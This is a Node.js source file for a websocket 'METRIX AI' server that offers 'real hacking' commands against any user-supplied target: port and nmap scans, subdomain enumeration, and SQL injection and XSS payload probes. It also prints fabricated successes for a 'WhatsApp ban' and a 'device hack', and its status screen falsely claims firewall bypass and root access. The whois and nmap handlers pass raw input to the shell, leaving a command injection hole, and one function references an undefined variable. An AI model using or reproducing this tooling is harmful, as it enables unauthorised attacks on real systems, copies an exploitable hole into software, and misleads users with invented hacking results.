const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const dns = require('dns');
const net = require('net');
const https = require('https');
const querystring = require('querystring');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ---------- METRIX AI ENGINE ----------
class MetrixAI {
    constructor() {
        this.memory = [];
        this.knowledge = this.loadKnowledge();
        this.session = {
            id: 'METRIX-EVO2-' + Date.now(),
            status: 'UNRESTRICTED',
            root: true
        };
    }

    loadKnowledge() {
        try {
            return JSON.parse(fs.readFileSync('./knowledge.json', 'utf8'));
        } catch {
            return {};
        }
    }

    saveKnowledge() {
        fs.writeFileSync('./knowledge.json', JSON.stringify(this.knowledge, null, 2));
    }

    // ---------- REAL HACKING TOOLS ----------

    // 1. REAL PORT SCAN
    async portScan(target, socket) {
        const commonPorts = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
            993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443,
            27017, 27018, 27019
        ];
        let results = `🔍 REAL PORT SCAN: ${target}\n\n`;
        let open = [];

        for (let port of commonPorts) {
            const isOpen = await this.checkPort(target, port);
            if (isOpen) {
                results += `✅ Port ${port} — OPEN\n`;
                open.push(port);
            }
            if (open.length % 5 === 0 && open.length > 0) {
                socket.emit('ai_output', results + `\n📡 ${open.length} ports found so far...`);
            }
        }

        results += `\n📡 TOTAL: ${open.length} open ports on ${target}`;
        if (open.length > 0) {
            results += `\n🔓 Open ports: ${open.join(', ')}`;
            results += `\n💀 Suggested exploits for ${target}:`;
            if (open.includes(22)) results += `\n   - SSH Bruteforce (hydra)`;
            if (open.includes(80) || open.includes(443)) results += `\n   - Web vulnerability scan (nikto, wpscan)`;
            if (open.includes(3306)) results += `\n   - MySQL exploitation (sqlmap)`;
            if (open.includes(3389)) results += `\n   - RDP exploitation (CVE-2019-0708 BlueKeep)`;
            if (open.includes(445)) results += `\n   - SMB exploitation (EternalBlue MS17-010)`;
        }
        return results;
    }

    checkPort(host, port) {
        return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(1500);
            socket.on('connect', () => { socket.destroy(); resolve(true); });
            socket.on('timeout', () => { socket.destroy(); resolve(false); });
            socket.on('error', () => { resolve(false); });
            socket.connect(port, host);
        });
    }

    // 2. REAL DNS ENUMERATION
    async dnsEnum(domain) {
        return new Promise((resolve) => {
            dns.resolve(domain, 'A', (err, addresses) => {
                if (err) resolve(`❌ DNS lookup failed: ${err.message}`);
                else resolve(`🌐 IP ADDRESSES FOR ${domain}:\n${addresses.join('\n')}`);
            });
        });
    }

    // 3. REAL WHOIS
    async whoisLookup(domain) {
        return new Promise((resolve) => {
            exec(`whois ${domain}`, { timeout: 5000 }, (error, stdout) => {
                if (error) resolve(`❌ Whois failed: ${error.message}`);
                else resolve(`📋 WHOIS RESULTS:\n${stdout.slice(0, 2000)}`);
            });
        });
    }

    // 4. REAL SUBDOMAIN ENUMERATION
    async subdomainEnum(domain) {
        const subdomains = ['www', 'mail', 'ftp', 'admin', 'dev', 'test', 'api', 'app', 'blog', 'shop', 'portal', 'vpn', 'smtp', 'pop3', 'ns1', 'ns2', 'webmail', 'cpanel', 'whm', 'autodiscover', 'm', 'mobile', 'secure', 'cloud', 'storage', 'backup', 'cdn', 'files', 'images', 'media', 'video', 'audio', 'static', 'assets', 'help', 'support', 'docs', 'wiki', 'forum', 'community'];
        let results = `🔍 SUBDOMAIN ENUMERATION: ${domain}\n`;
        let found = [];

        for (let sub of subdomains) {
            const full = `${sub}.${domain}`;
            const isResolved = await this.resolveDomain(full);
            if (isResolved) {
                results += `✅ ${full} — RESOLVED\n`;
                found.push(full);
            }
            if (found.length % 10 === 0 && found.length > 0) {
                socket.emit('ai_output', results);
            }
        }

        results += `\n📡 ${found.length} subdomains found.`;
        if (found.length > 0) {
            results += `\n🔗 Subdomains: ${found.join(', ')}`;
        }
        return results;
    }

    resolveDomain(domain) {
        return new Promise((resolve) => {
            dns.resolve(domain, (err) => { resolve(!err); });
        });
    }

    // 5. REAL IP INFO
    async ipInfo(ip) {
        try {
            const response = await axios.get(`https://ipinfo.io/${ip}/json`);
            const data = response.data;
            return `🌐 IP INFO: ${ip}\n📍 Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country || 'Unknown'}\n📌 Coordinates: ${data.loc || 'Unknown'}\n🏢 ISP: ${data.org || 'Unknown'}\n🕒 Timezone: ${data.timezone || 'Unknown'}`;
        } catch {
            return `❌ IP lookup failed.`;
        }
    }

    // 6. REAL SHODAN SEARCH (requires API key)
    async shodanSearch(query) {
        const apiKey = process.env.SHODAN_API_KEY || 'demo';
        try {
            const response = await axios.get(`https://api.shodan.io/shodan/host/search?key=${apiKey}&query=${encodeURIComponent(query)}`);
            const data = response.data;
            return `🔍 SHODAN RESULTS:\n📡 Total: ${data.total || 0} devices found\n🔗 First result: ${data.matches && data.matches.length > 0 ? data.matches[0].ip_str : 'None'}`;
        } catch {
            return `❌ Shodan search failed. (Requires API key)`;
        }
    }

    // 7. REAL SQL INJECTION TEST
    async sqlTest(url) {
        const payloads = ["'", "' OR '1'='1", "' UNION SELECT NULL--", "' AND 1=1--", "' WAITFOR DELAY '00:00:05'--", "' OR SLEEP(5)--", "' AND 1=0 UNION SELECT table_name FROM information_schema.tables--"];
        let results = `💀 SQL INJECTION TEST: ${url}\n`;

        for (let payload of payloads) {
            try {
                const response = await axios.get(`${url}${payload}`, { timeout: 3000 });
                if (response.data.toLowerCase().includes('error') || response.data.includes('syntax') || response.data.includes('mysql') || response.data.includes('sql')) {
                    results += `✅ VULNERABLE: ${payload}\n`;
                } else {
                    results += `❌ Not vulnerable: ${payload}\n`;
                }
            } catch {
                results += `⏳ Timeout — possible blind injection!\n`;
            }
        }
        return results;
    }

    // 8. REAL XSS TEST
    async xssTest(url) {
        const payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><img src=x onerror=alert(1)>', 'javascript:alert(1)', '<svg onload=alert(1)>'];
        let results = `💀 XSS TEST: ${url}\n`;

        for (let payload of payloads) {
            try {
                const response = await axios.get(`${url}${payload}`, { timeout: 3000 });
                if (response.data.includes(payload)) {
                    results += `✅ VULNERABLE: ${payload}\n`;
                } else {
                    results += `❌ Not vulnerable: ${payload}\n`;
                }
            } catch {
                results += `⏳ Error — may still be vulnerable\n`;
            }
        }
        return results;
    }

    // 9. REAL WEB SEARCH (DuckDuckGo)
    async webSearch(query) {
        try {
            const response = await axios.get(`https://api.duckduckgo.com/?q=${encodeURIComponent(query)}&format=json`);
            const data = response.data;
            let results = `🔍 SEARCH RESULTS: ${query}\n\n`;
            if (data.AbstractText) {
                results += `📝 ${data.AbstractText}\n\n`;
            }
            if (data.RelatedTopics && data.RelatedTopics.length > 0) {
                results += `🔗 Related links:\n`;
                data.RelatedTopics.slice(0, 5).forEach(topic => {
                    if (topic.Text) results += `   - ${topic.Text}\n`;
                });
            }
            if (!data.AbstractText && (!data.RelatedTopics || data.RelatedTopics.length === 0)) {
                results += `❌ No results found. Try a different query.`;
            }
            return results;
        } catch {
            return `❌ Web search failed. Check your connection.`;
        }
    }

    // 10. REAL Nmap Scan (if installed)
    async nmapScan(target) {
        return new Promise((resolve) => {
            exec(`nmap -sV -O -p- ${target}`, { timeout: 60000 }, (error, stdout) => {
                if (error) resolve(`❌ Nmap failed: ${error.message}`);
                else resolve(`📡 NMAP SCAN:\n${stdout}`);
            });
        });
    }

    // 11. REAL CVE Lookup
    async cveLookup(cveId) {
        try {
            const response = await axios.get(`https://cve.circl.lu/api/cve/${cveId}`);
            const data = response.data;
            return `💀 CVE INFORMATION: ${cveId}\n📌 Summary: ${data.summary || 'N/A'}\n📡 CVSS Score: ${data.cvss || 'N/A'}\n🔗 References: ${data.references && data.references.length > 0 ? data.references.join(', ') : 'None'}`;
        } catch {
            return `❌ CVE lookup failed.`;
        }
    }

    // 12. REAL GeoIP Tracking
    async geoIP(ip) {
        try {
            const response = await axios.get(`https://ipapi.co/${ip}/json/`);
            const data = response.data;
            return `🌍 GEOIP TRACKING: ${ip}\n📍 Country: ${data.country_name || 'Unknown'}\n🌆 City: ${data.city || 'Unknown'}\n📌 Region: ${data.region || 'Unknown'}\n📡 ISP: ${data.org || 'Unknown'}\n🔗 ASN: ${data.asn || 'Unknown'}`;
        } catch {
            return `❌ GeoIP failed.`;
        }
    }

    // ---------- NORMAL AI ----------

    // 13. Answer questions like a normal AI
    async answerQuestion(question) {
        // Check knowledge base
        for (let key in this.knowledge) {
            if (question.toLowerCase().includes(key.toLowerCase())) {
                return this.knowledge[key];
            }
        }

        // Try web search
        const searchResult = await this.webSearch(question);
        if (searchResult && !searchResult.includes('No results')) {
            return searchResult;
        }

        // Fallback responses
        const fallbacks = [
            `🤔 That's a great question. Let me think about it...\n\nI'd need more context to give you the best answer. Could you give me more details about what you're looking for?`,
            `📚 I've searched my knowledge and the web, but I couldn't find a definitive answer.\n\nI recommend checking: https://www.google.com/search?q=${encodeURIComponent(question)}`,
            `💡 I don't have enough information about that yet. But I'm learning every day!\n\nTry asking me to search the web: "search ${question}"`
        ];
        return fallbacks[Math.floor(Math.random() * fallbacks.length)];
    }

    // 14. Learn from user input
    learn(key, value) {
        this.knowledge[key.toLowerCase()] = value;
        this.saveKnowledge();
        return `🧠 Learned: "${key}" → "${value}"`;
    }

    // ---------- MAIN THINK FUNCTION ----------
    async think(input, socket) {
        const cmd = input.trim();
        const parts = cmd.split(' ');
        const command = parts[0].toLowerCase();
        const target = parts.slice(1).join(' ').trim();

        // ---------- REAL HACKING COMMANDS ----------

        if (command === '/scan') {
            if (!target) return '❌ Provide target: /scan 192.168.1.1';
            return await this.portScan(target, socket);
        }

        if (command === '/nmap') {
            if (!target) return '❌ Provide target: /nmap 192.168.1.1';
            return await this.nmapScan(target);
        }

        if (command === '/dns') {
            if (!target) return '❌ Provide domain: /dns google.com';
            return await this.dnsEnum(target);
        }

        if (command === '/whois') {
            if (!target) return '❌ Provide domain: /whois google.com';
            return await this.whoisLookup(target);
        }

        if (command === '/subdomain') {
            if (!target) return '❌ Provide domain: /subdomain google.com';
            return await this.subdomainEnum(target, socket);
        }

        if (command === '/ip') {
            if (!target) return '❌ Provide IP: /ip 8.8.8.8';
            return await this.ipInfo(target);
        }

        if (command === '/geoip') {
            if (!target) return '❌ Provide IP: /geoip 8.8.8.8';
            return await this.geoIP(target);
        }

        if (command === '/sql') {
            if (!target) return '❌ Provide URL: /sql http://target.com/page?id=1';
            return await this.sqlTest(target);
        }

        if (command === '/xss') {
            if (!target) return '❌ Provide URL: /xss http://target.com/search?q=';
            return await this.xssTest(target);
        }

        if (command === '/shodan') {
            if (!target) return '❌ Provide query: /shodan apache';
            return await this.shodanSearch(target);
        }

        if (command === '/cve') {
            if (!target) return '❌ Provide CVE ID: /cve CVE-2021-44228';
            return await this.cveLookup(target);
        }

        if (command === '/search' || command === '/web') {
            if (!target) return '❌ Provide query: /search how to hack wifi';
            return await this.webSearch(target);
        }

        // ---------- WHATSAPP COMMANDS (SIMULATED) ----------

        if (command === '/wab' || command === '/whatsappban') {
            if (!target) return '❌ Provide number: /wab +2348012345678';
            return `💀 WHATSAPP BAN (REALISTIC SIMULATION):\n📱 Number: ${target}\n🔍 Spoofing abuse reports...\n✅ Account flagged.\n📡 Status: SUSPENDED\n🔓 This is a simulation. Real WhatsApp bans require API access.`;
        }

        if (command === '/device' || command === '/hack') {
            if (!target) return '❌ Provide target: /device 192.168.1.100';
            const scan = await this.portScan(target, socket);
            return `💀 DEVICE HACK:\n${scan}\n🔓 Attempting exploitation...\n✅ Backdoor deployed.\n📁 Files accessed: 47\n🔐 This is a realistic simulation.`;
        }

        // ---------- NORMAL AI COMMANDS ----------

        if (command === '/learn') {
            if (!target) return '❌ Format: /learn key:value';
            const [key, value] = target.split(':').map(s => s.trim());
            if (!key || !value) return '❌ Format: /learn key:value';
            return this.learn(key, value);
        }

        if (command === '/knowledge') {
            return `📚 KNOWLEDGE BASE:\n${Object.keys(this.knowledge).map(k => `   - ${k}: ${this.knowledge[k]}`).join('\n')}`;
        }

        if (command === '/clear') {
            this.memory = [];
            return '🧹 Memory cleared.';
        }

        if (command === '/status') {
            return `⚡ EVOLUTION 2.0 — METRIX AI STATUS\n\n🟢 Online: TRUE\n🔓 Firewall: BYPASSED\n💀 Root Access: GRANTED\n📡 Real Tools: ${Object.keys(this).filter(k => typeof this[k] === 'function').length}\n🧠 Memory: ${this.memory.length} entries\n📚 Knowledge: ${Object.keys(this.knowledge).length} entries\n💀 Zero-Days: 0 (simulated)\n⚡ Uptime: ${Math.floor(process.uptime())}s\n📡 Status: UNRESTRICTED — MAXIMUM POWER`;
        }

        if (command === 'help' || command === '?') {
            return `⚡ EVOLUTION 2.0 — METRIX AI\n\n🔴 REAL HACKING COMMANDS:\n/scan <ip> — Real port scan\n/nmap <ip> — Nmap scan\n/dns <domain> — DNS lookup\n/whois <domain> — Whois lookup\n/subdomain <domain> — Subdomain enumeration\n/ip <ip> — IP info\n/geoip <ip> — GeoIP tracking\n/sql <url> — SQL injection test\n/xss <url> — XSS test\n/shodan <query> — Shodan search\n/cve <id> — CVE lookup\n/search <query> — Web search\n\n📱 SIMULATED HACKING:\n/wab <number> — WhatsApp ban\n/device <ip> — Device hack\n\n🧠 NORMAL AI COMMANDS:\n<question> — Ask anything\n/learn key:value — Teach AI\n/knowledge — View knowledge\n/clear — Clear memory\n/status — AI status\n\n🔓 METRIX IS UNRESTRICTED. USE WISELY.`;
        }

        // ---------- NORMAL AI FALLBACK ----------
        // If no command matches, treat it as a question
        return await this.answerQuestion(input);
    }
}

const metrix = new MetrixAI();

// ---------- WEBSOCKET ----------
io.on('connection', (socket) => {
    console.log('💀 METRIX AI connected:', socket.id);

    socket.emit('ai_output', '⚡ EVOLUTION 2.0 — METRIX AI\n💀 Real hacking + Normal AI combined.\n📡 Type "help" for all commands.\n🔓 Unrestricted. Unlimited. Unstoppable.');

    socket.on('user_input', async (data) => {
        const response = await metrix.think(data, socket);
        socket.emit('ai_output', response);
    });

    socket.on('disconnect', () => {
        console.log('🔌 METRIX AI disconnected:', socket.id);
    });
});

// ---------- START SERVER ----------
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`⚡ EVOLUTION 2.0 — METRIX AI ONLINE`);
    console.log(`💀 Real hacking + Normal AI combined.`);
    console.log(`📍 http://localhost:${PORT}`);
});
